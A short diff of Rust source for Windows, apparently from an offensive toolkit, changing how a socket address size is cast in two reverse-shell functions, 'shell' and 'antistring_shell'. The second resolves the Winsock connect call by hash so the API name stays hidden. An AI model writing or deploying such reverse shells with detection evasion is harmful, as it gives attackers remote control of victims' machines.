@@ -60,7 +60,7 @@ pub fn shell(ip: &str, port: u16) {
     // Connect the socket!
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-connect
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/Networking/WinSock/fn.connect.html
-    let connection_result = unsafe { connect(socket, &sockaddr_in as *const SOCKADDR_IN as *const SOCKADDR, mem::size_of::<SOCKADDR_IN>().try_into().unwrap()) };
+    let connection_result = unsafe { connect(socket, &sockaddr_in as *const SOCKADDR_IN as *const SOCKADDR, mem::size_of::<SOCKADDR_IN>() as _) };
     if connection_result != 0 {
         panic!("Unable to call connect to the remote socket")
     }
@@ -149,7 +149,7 @@ pub fn antistring_shell(ip: &str, port: u16) {
     let function = rco_utils::find_function_address("Ws2_32", 0xcbfa974b4e43f414).unwrap();
     unsafe { 
         mem::transmute::<*const (), fn(SOCKET, *const SOCKADDR, i32) -> i32>
-        (function)(socket, &sockaddr_in as *const SOCKADDR_IN as *const SOCKADDR, mem::size_of::<SOCKADDR_IN>().try_into().unwrap())
+        (function)(socket, &sockaddr_in as *const SOCKADDR_IN as *const SOCKADDR, mem::size_of::<SOCKADDR_IN>() as _)
     };
 
     // See line 59
